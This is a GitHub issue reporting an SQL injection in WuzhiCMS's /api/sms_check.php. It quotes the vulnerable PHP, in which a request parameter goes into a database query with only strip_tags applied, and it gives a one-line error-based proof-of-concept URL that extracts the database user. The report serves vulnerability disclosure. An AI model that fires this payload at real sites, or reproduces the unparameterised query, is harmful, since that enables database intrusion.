## Description

[![@love71](https://avatars.githubusercontent.com/u/28595159?v=4&size=48)](/love71)[love71](https://github.com/love71)opened [on May 28, 2018](https://github.com/wuzhicms/wuzhicms/issues/138#issue-326902747)

POC：

/api/sms\_check.php?param=1%27and extractvalue(1,concat(0x7e,user()))%23

Vulnerability file: /api/sms\_check.php

define('WWW\_ROOT',substr(dirname(**FILE**), 0, -4).'/');

require '../configs/web\_config.php';

require COREframe\_ROOT.'core.php';

if(!isset($GLOBALS['param'])) {

exit('{"info":"验证失败","status":"n"}');

} elseif($GLOBALS['param']=='') {

exit('{"info":"验证失败","status":"n"}');

}

$code = strip\_tags($GLOBALS['param']);

$posttime = SYS\_TIME-300;//5分钟内有效

$db = load\_class('db');

$r = $db->get\_one('sms\_checkcode',"`code`='$code' AND `posttime`>$posttime",'\*',0,'id DESC');

if($r) {

exit('{"info":"验证通过","status":"y"}');

} else {

exit('{"info":"验证失败","status":"n"}');

}

The $code parameter is taken directly into the execution of the get\_one function without any filtering. The get\_one function also detects the incoming SQL filtering, resulting in SQL injection.

The official website has been reproduced successfully.
